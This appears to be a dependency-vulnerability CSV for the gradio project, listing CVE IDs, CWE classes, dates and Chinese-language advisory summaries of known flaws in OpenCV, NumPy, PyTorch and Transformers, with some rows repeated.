gradio-app_gradio,opencv-python,,True,CVE-2016-1516,CWE-415,2017-04-09,"OpenCV是一个开源的、跨平台的、轻量级的计算机视觉库。
OpenCV 3.0.0版本中存在双重释放漏洞。攻击者可利用该漏洞执行任意代码。",2,0
gradio-app_gradio,opencv-python,,True,CVE-2017-12864,CWE-190,2017-08-15,"OpenCV是一个开源的、跨平台的、轻量级的计算机视觉库。
OpenCV 3.3及之前的版本中的opencv/modules/imgcodecs/src/grfmt_pxm.cpp文件的‘ReadNumber’函数存在整数溢出漏洞，该漏洞源于程序没有检测输入的长度。远程攻击者可利用该漏洞执行代码或造成拒绝服务。",2,0
gradio-app_gradio,opencv-python,,True,CVE-2017-17760,CWE-119,2017-12-21,"OpenCV是一个开源的、跨平台的、轻量级的计算机视觉库。
OpenCV 3.3.1版本中的grfmt_pxm.cpp文件的‘cv::PxMDecoder::readData’函数存在缓冲区溢出漏洞，该漏洞源于程序使用了不正确的大小值。攻击者可利用该漏洞造成拒绝服务（崩溃）。",3,0
gradio-app_gradio,opencv-python,,True,CVE-2017-12603,CWE-787,2017-08-07,"OpenCV是一个开源的、跨平台的、轻量级的计算机视觉库。
OpenCV 3.3及之前的版本的modules/imgcodecs/src/bitstrm.cpp文件的‘cv::RLByteStream::getBytes’函数存在缓冲区溢出漏洞。攻击者可利用该漏洞造成拒绝服务（无效内存写入）。",2,0
gradio-app_gradio,opencv-python,,True,CVE-2019-15939,CWE-369,2019-09-05,"OpenCV是一款开源的、跨平台的、轻量级计算机视觉库。
OpenCV 4.1.0版本中的modules/objdetect/src/hog.cpp文件的cv::HOGDescriptor::getDescriptorSize存在数字错误漏洞。该漏洞源于网络系统或产品未正确计算或转换所产生的数字。攻击者可利用该漏洞导致整数溢出或符号错误等。",3,0
gradio-app_gradio,opencv-python,,True,CVE-2017-12598,CWE-125,2017-08-07,"OpenCV是一个开源的、跨平台的、轻量级的计算机视觉库。
OpenCV 3.3及之前的版本中的modules/imgcodecs/src/bitstrm.cpp文件的‘cv::RBaseStream::readBlock’函数存在安全漏洞。攻击者可利用该漏洞造成拒绝服务（越边界读取）。",2,0
gradio-app_gradio,opencv-python,,True,CVE-2019-14493,CWE-476,2019-08-01,"OpenCV是一款开源的、跨平台的、轻量级计算机视觉库。
OpenCV 4.1.1之前版本中的modules/core/src/persistence.cpp文件的‘cv::XMLParser::parse’函数存在代码问题漏洞。该漏洞源于网络系统或产品的代码开发过程中存在设计或实现不当的问题。",2,2
gradio-app_gradio,opencv-python,,True,CVE-2017-12605,CWE-787,2017-08-07,"OpenCV是一个开源的、跨平台的、轻量级的计算机视觉库。
OpenCV 3.3及之前的版本中的utils.cpp文件的‘FillColorRow8’函数存在安全漏洞。攻击者可利用该漏洞造成拒绝服务（越边界写入）。",2,0
gradio-app_gradio,opencv-python,,True,CVE-2017-12863,CWE-190,2017-08-15,"OpenCV是一个开源的、跨平台的、轻量级的计算机视觉库。
OpenCV 3.3及之前的版本中的opencv/modules/imgcodecs/src/grfmt_pxm.cpp文件的‘PxMDecoder::readData’函数存在整数溢出漏洞。远程攻击者可利用该漏洞执行代码或造成拒绝服务。",2,0
gradio-app_gradio,opencv-python,,True,CVE-2018-5268,CWE-787,2018-01-08,"OpenCV是一个开源的、跨平台的、轻量级的计算机视觉库。
OpenCV 3.3.1版本中的modules/imgcodecs/src/grfmt_jpeg2000.cpp文件的‘cv::Jpeg2KDecoder::readComponent8u’函数存在基于堆的缓冲区溢出漏洞。攻击者可借助特制的图像文件利用该漏洞造成拒绝服务（崩溃）。",3,0
gradio-app_gradio,opencv-python,,True,CVE-2017-12862,CWE-787,2017-08-15,"OpenCV是一个开源的、跨平台的、轻量级的计算机视觉库。
OpenCV 3.3及之前的版本中的modules/imgcodecs/src/grfmt_pxm.cpp文件存在安全漏洞。远程攻击者可利用该漏洞执行代码或造成拒绝服务。",2,0
gradio-app_gradio,opencv-python,,True,CVE-2017-14136,CWE-787,2017-09-04,"OpenCV(Open Source Computer Vision Library)是一个开源的、跨平台的、轻量级的计算机视觉库。

OpenCV 3.3版本中的utils.cpp文件的‘FillColorRow1’函数存在安全漏洞。攻击者可利用该漏洞造成拒绝服务（越边界写入）。",3,0
gradio-app_gradio,opencv-python,,True,CVE-2017-1000450,CWE-190,2018-01-02,"Opencv是一个开源的、跨平台的、轻量级的计算机视觉库。
Opencv 3.3及之前的版本中的opencv/modules/imgcodecs/src/utils.cpp文件的‘FillUniColor’和‘FillUniGray’函数存在整数溢出漏洞，该漏洞源于程序没有检测输入的长度。远程攻击者可利用该漏洞执行代码或造成拒绝服务。",2,0
gradio-app_gradio,opencv-python,,True,CVE-2017-18009,CWE-125,2018-01-01,"OpenCV是一个开源的、跨平台的、轻量级的计算机视觉库。

OpenCV 3.3.1版本中的modules/imgcodecs/src/grfmt_hdr.cpp文件的‘cv::HdrDecoder::checkSignature’函数存在缓冲区溢出漏洞。攻击者可利用该漏洞造成拒绝服务（基于堆的缓冲区越边界读取）。",2,2
gradio-app_gradio,opencv-python,,True,CVE-2018-5269,CWE-617,2018-01-08,"OpenCV是一个开源的、跨平台的、轻量级的计算机视觉库。
OpenCV 3.3.1版本中的modules/imgcodecs/src/bitstrm.cpp文件的‘cv::RBaseStream::setPos’函数存在安全漏洞。攻击者可利用该漏洞造成拒绝服务（断言失败和崩溃）。",3,0
gradio-app_gradio,opencv-python,,True,CVE-2016-1516,CWE-415,2017-04-09,"OpenCV是一个开源的、跨平台的、轻量级的计算机视觉库。
OpenCV 3.0.0版本中存在双重释放漏洞。攻击者可利用该漏洞执行任意代码。",2,0
gradio-app_gradio,opencv-python,,True,CVE-2017-12864,CWE-190,2017-08-15,"OpenCV是一个开源的、跨平台的、轻量级的计算机视觉库。
OpenCV 3.3及之前的版本中的opencv/modules/imgcodecs/src/grfmt_pxm.cpp文件的‘ReadNumber’函数存在整数溢出漏洞，该漏洞源于程序没有检测输入的长度。远程攻击者可利用该漏洞执行代码或造成拒绝服务。",2,0
gradio-app_gradio,opencv-python,,True,CVE-2017-17760,CWE-119,2017-12-21,"OpenCV是一个开源的、跨平台的、轻量级的计算机视觉库。
OpenCV 3.3.1版本中的grfmt_pxm.cpp文件的‘cv::PxMDecoder::readData’函数存在缓冲区溢出漏洞，该漏洞源于程序使用了不正确的大小值。攻击者可利用该漏洞造成拒绝服务（崩溃）。",3,0
gradio-app_gradio,opencv-python,,True,CVE-2017-12603,CWE-787,2017-08-07,"OpenCV是一个开源的、跨平台的、轻量级的计算机视觉库。
OpenCV 3.3及之前的版本的modules/imgcodecs/src/bitstrm.cpp文件的‘cv::RLByteStream::getBytes’函数存在缓冲区溢出漏洞。攻击者可利用该漏洞造成拒绝服务（无效内存写入）。",2,0
gradio-app_gradio,opencv-python,,True,CVE-2019-15939,CWE-369,2019-09-05,"OpenCV是一款开源的、跨平台的、轻量级计算机视觉库。
OpenCV 4.1.0版本中的modules/objdetect/src/hog.cpp文件的cv::HOGDescriptor::getDescriptorSize存在数字错误漏洞。该漏洞源于网络系统或产品未正确计算或转换所产生的数字。攻击者可利用该漏洞导致整数溢出或符号错误等。",3,0
gradio-app_gradio,opencv-python,,True,CVE-2017-12598,CWE-125,2017-08-07,"OpenCV是一个开源的、跨平台的、轻量级的计算机视觉库。
OpenCV 3.3及之前的版本中的modules/imgcodecs/src/bitstrm.cpp文件的‘cv::RBaseStream::readBlock’函数存在安全漏洞。攻击者可利用该漏洞造成拒绝服务（越边界读取）。",2,0
gradio-app_gradio,numpy,,True,CVE-2019-6446,CWE-502,2019-01-16,<p>NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。 NumPy 1.16.0 版本及之前版本存在代码问题漏洞，该漏洞源于不安全地使用 pickle 模块。</p>,1,1
gradio-app_gradio,numpy,,True,CVE-2021-33430,CWE-120,2021-12-17,"NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.9版本存在缓冲区错误漏洞，该漏洞源于在ctor .c的 PyArray_NewFromDescr_int函数中缺少对于数组长度的限制，导致缓冲区溢出漏洞，当从Python代码指定大维度(超过32)的数组时，这可能会让恶意用户导致拒绝服务。",3,0
gradio-app_gradio,numpy,,True,CVE-2021-41495,CWE-476,2021-12-17,"NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.19存在代码问题漏洞，该漏洞源于。numpy存在空指针解引用漏洞。在软件中的PyArray_DescrNew函数中，由于缺少返回值验证，导致了空指针解引用漏洞、这允许攻击者可利用该漏洞通过重复创建排序数组来进行DoS攻击。",3,0
gradio-app_gradio,numpy,,True,CVE-2021-34141,CWE-697,2021-12-17,"NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.9存在安全漏洞，该漏洞源于软件中不完整的字符串比较。它允许攻击者可利用该漏洞通过构造特定的字符串对象来破坏api。",3,2
gradio-app_gradio,numpy,,True,CVE-2014-1858,CWE-20,2014-02-05,"NumPy是一个Python科学计算包，它支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.8.1之前的版本中的f2py的__init__.py文件存在安全漏洞。本地攻击者可通过对临时文件实施符号链接攻击利用该漏洞覆盖任意文件。",2,0
gradio-app_gradio,numpy,,True,CVE-2017-12852,CWE-835,2017-08-15,"NumPy是一个Python科学计算包，它支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
Numpy 1.13.1及之前的版本中的‘numpy.pad’函数存在安全漏洞，该漏洞源于程序缺少输入验证。攻击者可利用该漏洞造成拒绝服务（无限循环）。",2,1
gradio-app_gradio,numpy,,True,CVE-2014-1859,CWE-59,2014-02-05,"NumPy是一个Python科学计算包，它支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。

NumPy 1.8.1之前的版本中的core/tests/test_memmap.py、core/tests/test_multiarray.py、f2py/f2py2e.py和lib/tests/test_io.py文件存在安全漏洞。本地攻击者可通过对临时文件实施符号链接攻击利用该漏洞覆盖任意文件。",2,0
gradio-app_gradio,opencv-python,,True,CVE-2019-14493,CWE-476,2019-08-01,"OpenCV是一款开源的、跨平台的、轻量级计算机视觉库。
OpenCV 4.1.1之前版本中的modules/core/src/persistence.cpp文件的‘cv::XMLParser::parse’函数存在代码问题漏洞。该漏洞源于网络系统或产品的代码开发过程中存在设计或实现不当的问题。",2,2
gradio-app_gradio,opencv-python,,True,CVE-2017-12605,CWE-787,2017-08-07,"OpenCV是一个开源的、跨平台的、轻量级的计算机视觉库。
OpenCV 3.3及之前的版本中的utils.cpp文件的‘FillColorRow8’函数存在安全漏洞。攻击者可利用该漏洞造成拒绝服务（越边界写入）。",2,0
gradio-app_gradio,opencv-python,,True,CVE-2017-12863,CWE-190,2017-08-15,"OpenCV是一个开源的、跨平台的、轻量级的计算机视觉库。
OpenCV 3.3及之前的版本中的opencv/modules/imgcodecs/src/grfmt_pxm.cpp文件的‘PxMDecoder::readData’函数存在整数溢出漏洞。远程攻击者可利用该漏洞执行代码或造成拒绝服务。",2,0
gradio-app_gradio,opencv-python,,True,CVE-2018-5268,CWE-787,2018-01-08,"OpenCV是一个开源的、跨平台的、轻量级的计算机视觉库。
OpenCV 3.3.1版本中的modules/imgcodecs/src/grfmt_jpeg2000.cpp文件的‘cv::Jpeg2KDecoder::readComponent8u’函数存在基于堆的缓冲区溢出漏洞。攻击者可借助特制的图像文件利用该漏洞造成拒绝服务（崩溃）。",3,0
gradio-app_gradio,opencv-python,,True,CVE-2017-12862,CWE-787,2017-08-15,"OpenCV是一个开源的、跨平台的、轻量级的计算机视觉库。
OpenCV 3.3及之前的版本中的modules/imgcodecs/src/grfmt_pxm.cpp文件存在安全漏洞。远程攻击者可利用该漏洞执行代码或造成拒绝服务。",2,0
gradio-app_gradio,opencv-python,,True,CVE-2017-14136,CWE-787,2017-09-04,"OpenCV(Open Source Computer Vision Library)是一个开源的、跨平台的、轻量级的计算机视觉库。

OpenCV 3.3版本中的utils.cpp文件的‘FillColorRow1’函数存在安全漏洞。攻击者可利用该漏洞造成拒绝服务（越边界写入）。",3,0
gradio-app_gradio,opencv-python,,True,CVE-2017-1000450,CWE-190,2018-01-02,"Opencv是一个开源的、跨平台的、轻量级的计算机视觉库。
Opencv 3.3及之前的版本中的opencv/modules/imgcodecs/src/utils.cpp文件的‘FillUniColor’和‘FillUniGray’函数存在整数溢出漏洞，该漏洞源于程序没有检测输入的长度。远程攻击者可利用该漏洞执行代码或造成拒绝服务。",2,0
gradio-app_gradio,opencv-python,,True,CVE-2017-18009,CWE-125,2018-01-01,"OpenCV是一个开源的、跨平台的、轻量级的计算机视觉库。

OpenCV 3.3.1版本中的modules/imgcodecs/src/grfmt_hdr.cpp文件的‘cv::HdrDecoder::checkSignature’函数存在缓冲区溢出漏洞。攻击者可利用该漏洞造成拒绝服务（基于堆的缓冲区越边界读取）。",2,2
gradio-app_gradio,opencv-python,,True,CVE-2018-5269,CWE-617,2018-01-08,"OpenCV是一个开源的、跨平台的、轻量级的计算机视觉库。
OpenCV 3.3.1版本中的modules/imgcodecs/src/bitstrm.cpp文件的‘cv::RBaseStream::setPos’函数存在安全漏洞。攻击者可利用该漏洞造成拒绝服务（断言失败和崩溃）。",3,0
gradio-app_gradio,opencv-python,,True,CVE-2016-1516,CWE-415,2017-04-09,"OpenCV是一个开源的、跨平台的、轻量级的计算机视觉库。
OpenCV 3.0.0版本中存在双重释放漏洞。攻击者可利用该漏洞执行任意代码。",2,0
gradio-app_gradio,opencv-python,,True,CVE-2017-12864,CWE-190,2017-08-15,"OpenCV是一个开源的、跨平台的、轻量级的计算机视觉库。
OpenCV 3.3及之前的版本中的opencv/modules/imgcodecs/src/grfmt_pxm.cpp文件的‘ReadNumber’函数存在整数溢出漏洞，该漏洞源于程序没有检测输入的长度。远程攻击者可利用该漏洞执行代码或造成拒绝服务。",2,0
gradio-app_gradio,opencv-python,,True,CVE-2017-17760,CWE-119,2017-12-21,"OpenCV是一个开源的、跨平台的、轻量级的计算机视觉库。
OpenCV 3.3.1版本中的grfmt_pxm.cpp文件的‘cv::PxMDecoder::readData’函数存在缓冲区溢出漏洞，该漏洞源于程序使用了不正确的大小值。攻击者可利用该漏洞造成拒绝服务（崩溃）。",3,0
gradio-app_gradio,opencv-python,,True,CVE-2017-12603,CWE-787,2017-08-07,"OpenCV是一个开源的、跨平台的、轻量级的计算机视觉库。
OpenCV 3.3及之前的版本的modules/imgcodecs/src/bitstrm.cpp文件的‘cv::RLByteStream::getBytes’函数存在缓冲区溢出漏洞。攻击者可利用该漏洞造成拒绝服务（无效内存写入）。",2,0
gradio-app_gradio,opencv-python,,True,CVE-2019-15939,CWE-369,2019-09-05,"OpenCV是一款开源的、跨平台的、轻量级计算机视觉库。
OpenCV 4.1.0版本中的modules/objdetect/src/hog.cpp文件的cv::HOGDescriptor::getDescriptorSize存在数字错误漏洞。该漏洞源于网络系统或产品未正确计算或转换所产生的数字。攻击者可利用该漏洞导致整数溢出或符号错误等。",3,0
gradio-app_gradio,opencv-python,,True,CVE-2017-12598,CWE-125,2017-08-07,"OpenCV是一个开源的、跨平台的、轻量级的计算机视觉库。
OpenCV 3.3及之前的版本中的modules/imgcodecs/src/bitstrm.cpp文件的‘cv::RBaseStream::readBlock’函数存在安全漏洞。攻击者可利用该漏洞造成拒绝服务（越边界读取）。",2,0
gradio-app_gradio,numpy,,True,CVE-2019-6446,CWE-502,2019-01-16,<p>NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。 NumPy 1.16.0 版本及之前版本存在代码问题漏洞，该漏洞源于不安全地使用 pickle 模块。</p>,1,1
gradio-app_gradio,numpy,,True,CVE-2021-33430,CWE-120,2021-12-17,"NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.9版本存在缓冲区错误漏洞，该漏洞源于在ctor .c的 PyArray_NewFromDescr_int函数中缺少对于数组长度的限制，导致缓冲区溢出漏洞，当从Python代码指定大维度(超过32)的数组时，这可能会让恶意用户导致拒绝服务。",3,0
gradio-app_gradio,numpy,,True,CVE-2021-41495,CWE-476,2021-12-17,"NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.19存在代码问题漏洞，该漏洞源于。numpy存在空指针解引用漏洞。在软件中的PyArray_DescrNew函数中，由于缺少返回值验证，导致了空指针解引用漏洞、这允许攻击者可利用该漏洞通过重复创建排序数组来进行DoS攻击。",3,0
gradio-app_gradio,numpy,,True,CVE-2021-34141,CWE-697,2021-12-17,"NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.9存在安全漏洞，该漏洞源于软件中不完整的字符串比较。它允许攻击者可利用该漏洞通过构造特定的字符串对象来破坏api。",3,2
gradio-app_gradio,numpy,,True,CVE-2014-1858,CWE-20,2014-02-05,"NumPy是一个Python科学计算包，它支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.8.1之前的版本中的f2py的__init__.py文件存在安全漏洞。本地攻击者可通过对临时文件实施符号链接攻击利用该漏洞覆盖任意文件。",2,0
gradio-app_gradio,numpy,,True,CVE-2017-12852,CWE-835,2017-08-15,"NumPy是一个Python科学计算包，它支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
Numpy 1.13.1及之前的版本中的‘numpy.pad’函数存在安全漏洞，该漏洞源于程序缺少输入验证。攻击者可利用该漏洞造成拒绝服务（无限循环）。",2,1
gradio-app_gradio,numpy,,True,CVE-2014-1859,CWE-59,2014-02-05,"NumPy是一个Python科学计算包，它支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。

NumPy 1.8.1之前的版本中的core/tests/test_memmap.py、core/tests/test_multiarray.py、f2py/f2py2e.py和lib/tests/test_io.py文件存在安全漏洞。本地攻击者可通过对临时文件实施符号链接攻击利用该漏洞覆盖任意文件。",2,0
gradio-app_gradio,torch,,True,CVE-2022-45907,CWE-94,2022-11-26,PyTorch是一个开源机器学习框架，提供张量计算、构建神经网络等功能。其torch.jit.annotations.parse_type_line组件存在代码注入漏洞，原因是对eval的使用不安全，导致潜在的任意代码执行。,1,2
gradio-app_gradio,torch,,True,CVE-2024-31580,CWE-122,2024-04-17,PyTorch是一个开源的Python包，主要用于张量计算和动态神经网络，并且具有强大的GPU加速功能。在v2.2.0之前的版本中，/runtime/vararg_functions.cpp组件中存在堆缓冲区溢出漏洞。由于函数的大小检查不当，攻击者可以通过提供精心构造的输入导致拒绝服务(DoS)，甚至可能执行任意代码。,2,0
gradio-app_gradio,torch,,True,CVE-2024-31583,CWE-416,2024-04-17,PyTorch 是一个以开源方式提供的 Python 库，专门用于神经网络构建与张量计算，具备强大的 GPU 加速能力。此漏洞涉及内存的释放后重用，位于 torch/csrc/jit/mobile/interpreter.cpp 组件中，由于内存管理不当可能导致此问题。攻击者可通过该漏洞执行任意代码或引发拒绝服务攻击。,2,0
gradio-app_gradio,torch,,True,CVE-2024-48063,CWE-502,2024-10-29,<p>PyTorch是一个由PyTorch开源社区提供的常用机器学习框架，广泛应用于深度学习和人工智能开发。此漏洞在PyTorch版本2.4.1及之前的版本中发现，该漏洞源于用于分布式RPC任务的RemoteModule模块。当应用程序允许从未经验证的来源加载和执行代码时，会导致远程代码执行漏洞。此漏洞会使攻击者能够在没有适当权限或安全审查的情况下执行任意代码。</p>,1,1
gradio-app_gradio,torch,,True,CVE-2025-3730,CWE-404,2025-04-16,PyTorch是一个广泛使用的开源深度学习框架，其提供了动态神经网络的构建和强力的GPU加速支持。该框架中的torch.nn.functional.ctc_loss函数在处理输入为空的张量时，会在文件 aten/src/ATen/native/LossCTC.cpp中引发拒绝服务漏洞。攻击者可以通过触发该漏洞使得系统崩溃，导致服务不可用。,3,0
gradio-app_gradio,torch,,True,CVE-2024-7804,CWE-502,,PyTorch 是一个开源的 Python 深度学习框架，广泛用于机器学习和人工智能应用。该框架的 RPC 组件 (torch.distributed.rpc) 在 2.3.1 及其之前的版本中存在反序列化漏洞。该漏洞源于在反序列化 PythonUDF 对象时缺乏安全验证，攻击者能够通过发送恶意序列化的 PythonUDF 对象来远程执行任意代码，从而在主节点上实现远程代码执行 (RCE)。,1,1
gradio-app_gradio,torch,,True,CVE-2025-32434,CWE-502,2025-04-18,PyTorch 是一个用于深度学习的 Python 包，提供强大的 GPU 加速和自动微分能力。该漏洞存在于 PyTorch 2.5.1 及之前的版本中。当用户使用 torch.load 方法并将 weights_only 参数设置为 True 时，攻击者可以通过构造恶意模型文件强制调用 legacy_load 方法，从而实现远程命令执行，即使官方文档认为在此模式下是安全的。漏洞的根本原因在于反序列化过程中缺乏充分的安全验证。,1,1
gradio-app_gradio,torch,,True,CVE-2025-2953,CWE-404,2025-03-30,PyTorch 是一个深度学习框架，提供了动态神经网络和张量计算功能。该组件中受影响的函数 torch.mkldnn_max_pool2d 存在一个拒绝服务漏洞。这是由于在处理张量过程中发生了不当的资源关闭或释放，可能导致系统崩溃。本地攻击者可以通过特制输入触发此漏洞，导致服务中断。,3,0
gradio-app_gradio,torch,,True,CVE-2024-31584,CWE-125,2024-04-19,"PyTorch是PyTorch开源的一个 Python 包。
Pytorch v2.2.0之前版本存在安全漏洞，该漏洞源于组件 torch/csrc/jit/mobile/flatbuffer_loader.cpp存在越界读取漏洞。",3,0
gradio-app_gradio,torch,,True,CVE-2025-55553,CWE-248,2025-09-25,PyTorch 是一个广泛使用的开源机器学习框架，主要用于深度学习模型的开发和训练。组件 proxy_tensor.py 是 PyTorch 的一部分，负责处理张量代理操作。此漏洞因组件 proxy_tensor.py 中存在的语法错误导致，攻击者可以通过触发该错误使目标系统进入不可用状态，从而造成拒绝服务（DoS）。利用该漏洞无需复杂的技术手段，可能通过特定的输入数据引发异常错误，从而导致服务中断。,3,2
gradio-app_gradio,torch,,True,CVE-2025-55560,CWE-400,2025-09-25,PyTorch 是一个广泛使用的开源深度学习框架，支持多种机器学习任务和模型训练。该漏洞影响 PyTorch v2.7.0，当模型使用了 `torch.Tensor.to_sparse()` 和 `torch.Tensor.to_dense()` 方法并通过 Inductor 编译时，可能会导致拒绝服务 (DoS)。漏洞成因可能与 Inductor 编译器在处理稀疏与密集张量转换时出现的内存或计算资源耗尽问题有关。攻击者可以通过特制的模型触发该问题，从而使系统无法正常响应。,4,2
gradio-app_gradio,torch,,True,CVE-2025-55558,CWE-400,2025-09-25,PyTorch 是一个广泛使用的开源深度学习框架，通常用于构建和训练神经网络。该框架支持多种模块和操作，包括 torch.nn.Conv2d（二维卷积层）、torch.nn.functional.hardshrink（硬收缩激活函数）以及 torch.Tensor.view 和 torch.mv（矩阵向量乘法）。Inductor 是 PyTorch 的编译器部分，负责将模型代码编译为高效运行的计算图。在 PyTorch v2.7.0 中，当包含上述模块的模型经过 Inductor 编译时，会触发缓冲区溢出问题。缓冲区溢出通常是由于代码中对内存管理不当或缺乏边界检查导致的，这可能会导致存储数据的内存被过度写入，从而破坏程序的正常运行。,4,2
gradio-app_gradio,torch,,True,CVE-2025-55557,CWE-248,2025-09-25,PyTorch 是一个广泛使用的开源深度学习框架，主要用于构建和训练神经网络。torch.cummin 是 PyTorch 中的一个函数，用于计算张量的逐元素累积最小值。Inductor 是 PyTorch 的一个编译器后端，用于优化模型运行性能。在 PyTorch v2.7.0 中，当模型包含 torch.cummin 函数并使用 Inductor 编译时，会触发 Name Error。此错误可能导致系统无法正常运行，进而引发拒绝服务（DoS）。漏洞的成因可能是 Inductor 编译器在处理 torch.cummin 函数时未正确处理某些变量或名称解析，导致程序在运行时崩溃。,3,2
gradio-app_gradio,torch,,True,CVE-2025-46148,CWE-1284,2025-09-25,PyTorch 是一个广泛使用的开源深度学习框架，支持动态计算图和自动梯度计算，用于构建和训练神经网络。nn.PairwiseDistance 是 PyTorch 中的一个模块，主要用于计算向量之间的距离。在 PyTorch 2.6.0 及之前的版本中，当启用 eager 模式时，该模块在计算 p=2 的距离时会产生错误结果。该问题可能由于实现中的算法逻辑错误或数据处理方式不当导致。,4,2
gradio-app_gradio,torch,,True,CVE-2025-2149,CWE-665,2025-03-10,<p>PyTorch 是一个开源的深度学习框架，广泛用于机器学习和人工智能领域。受影响的组件是量化 Sigmoid 模块中的 nnq_Sigmoid 函数。PyTorch 的量化机制旨在减少模型的大小并提高推理速度，其中 nnq_Sigmoid 函数是用于激活函数的量化实现。漏洞的根本原因在于对参数 scale/zero_point 的处理不当，导致该组件的初始化过程发生错误。这种处理不当可能导致量化参数在初始化过程中被错误设置，进而影响模型的精度或功能。</p>,4,0
gradio-app_gradio,torch,,True,CVE-2025-2148,CWE-119,2025-03-10,<p>PyTorch 是一个用于机器学习的开源 Python 库，广泛应用于深度学习模型的构建与训练。此漏洞出现在 PyTorch 2.6.0+cu124 版本的 torch.ops.profiler._call_end_callbacks_on_jit_fut 函数中，该函数处理过程中由于输入参数 None 导致内存损坏。这是一种缓冲区错误，可能由于未正确处理输入而导致不安全的内存操作。</p>,4,0
gradio-app_gradio,torch,,True,CVE-2025-3121,CWE-119,2025-04-02,<p>PyTorch是一个开源的机器学习框架，广泛用于深度学习模型的开发和训练。该框架的2.6.0版本中，torch.jit.jit_module_from_flatbuffer函数存在内存损坏问题，导致缓冲区错误。此漏洞源于函数在处理flatbuffer的数据时没有正确管理内存，可能引发内存溢出或损坏，从而影响系统稳定性。</p>,3,0
gradio-app_gradio,torch,,True,CVE-2025-2998,CWE-119,2025-03-31,<p>PyTorch 是一个开源的深度学习框架，广泛用于各种机器学习和深度学习项目。该漏洞影响了 PyTorch 版本 2.6.0 中的函数 torch.nn.utils.rnn.pad_packed_sequence。PyTorch 提供丰富的神经网络构件与优化工具，帮助开发者构建复杂的深度学习模型。在该漏洞中，由于函数在处理输入时未进行适当的长度验证，导致出现内存损坏问题。这种处理不当使得本地用户有机会通过特定输入数据触发内存操作异常，导致内存访问错误。</p>,3,0
gradio-app_gradio,torch,,True,CVE-2025-2999,CWE-119,2025-03-31,<p>PyTorch 是一个开源的机器学习框架，提供了深度学习所需的核心功能。此漏洞影响了 PyTorch 2.6.0 版本中的 torch.nn.utils.rnn.unpack_sequence 函数。由于该函数在处理内存操作时存在不当处理，导致出现内存损坏从而引发缓冲区溢出问题。漏洞成因根本于对输入数据的长度大小缺乏正确验证，可能导致系统的内存被意外覆盖或破坏。</p>,3,0
gradio-app_gradio,torch,,True,CVE-2025-3001,CWE-119,2025-03-31,<p>PyTorch 是一个广泛使用的开源深度学习框架，支持用于科学研究和商业应用的复杂张量计算和自动求导特性。该漏洞出现在 PyTorch 2.6.0 版本的 torch.lstm_cell 函数中，由于该函数未能正确验证输入数据的长度大小，攻击者可以通过操控输入数据导致内存损坏。由于内存地址定位错误或指针操作不当，使得进程内存中相邻区域可能被篡改或控制，进而引发程序异常或恶意代码执行。</p>,3,0
gradio-app_gradio,torch,,True,CVE-2025-3000,CWE-119,2025-03-31,<p>PyTorch 是一个广泛使用的深度学习框架，提供自动求导和灵活的计算图功能。漏洞存在于 PyTorch 2.6.0 的 torch.jit.script 函数中，导致内存损坏。此漏洞是由于函数未能正确验证输入数据的长度大小，引发缓冲区溢出，从而导致内存损坏和潜在的代码执行风险。</p>,3,0
gradio-app_gradio,transformers,,True,,CWE-601,2022-11-01,"## Overview
[transformers](https://pypi.org/project/transformers) is a State-of-the-art Machine Learning for JAX, PyTorch and TensorFlow

Affected versions of this package are vulnerable to Open Redirect due to referencing an obsolete link.
## Remediation
Upgrade `transformers` to version 4.23.0 or higher.
## References
- [GitHub Commit](https://github.com/huggingface/transformers/commit/ce2620194b4a8f070cd29504d34a79758affdf95)
- [GitHub PR](https://github.com/huggingface/transformers/pull/19001)
- [GitHub Release](https://github.com/huggingface/transformers/releases/tag/v4.23.0)
",3,0
gradio-app_gradio,transformers,,True,CVE-2023-2800,CWE-377,,Hugging Face Transformers 是用于 JAX、PyTorch 和 TensorFlow 的先进自然语言处理库。该漏洞出现在 4.30.0 之前的版本中，源于使用过时的 tempfile.mktemp() 方法。该方法不安全，因为在调用 mktemp() 与文件创建之间，可能有其他进程创建同名文件。这可能导致文件可用性受干扰，并可能导致敏感信息泄露。,3,1
gradio-app_gradio,transformers,,True,CVE-2023-6730,CWE-502,,Hugging Face Transformers 是为 JAX、PyTorch 和 TensorFlow 提供的先进自然语言处理框架。此组件用于处理自然语言任务，如文本分类、翻译和问答系统等。漏洞发生在 Transformers 4.36.0 之前的版本，其 root cause 是在 `RagRetriever.from_pretrained()` 函数中，`index_name` 和 `index_path` 参数会反序列化不受信任的数据，攻击者可以远程加载恶意 pickle 文件，从而绕过文件检查并在主机上执行任意代码。反序列化是将字节序列转换为对象的过程，被用于通信和存储。此漏洞允许攻击者在未验证数据合法性的情况下进行反序列化，导致代码执行。,1,1
gradio-app_gradio,transformers,,True,CVE-2023-7018,CWE-502,,Hugging Face Transformers是一个用于JAX、PyTorch和TensorFlow的先进自然语言处理库。在受到影响的版本中，使用TransfoXLTokenizer()函数可能会自动加载恶意的vocab.pkl文件，利用pickle.load函数反序列化不受信任的数据。此漏洞源于未能充分验证反序列化的数据，使攻击者可执行任意代码，控制应用程序的状态或执行流程。,1,1
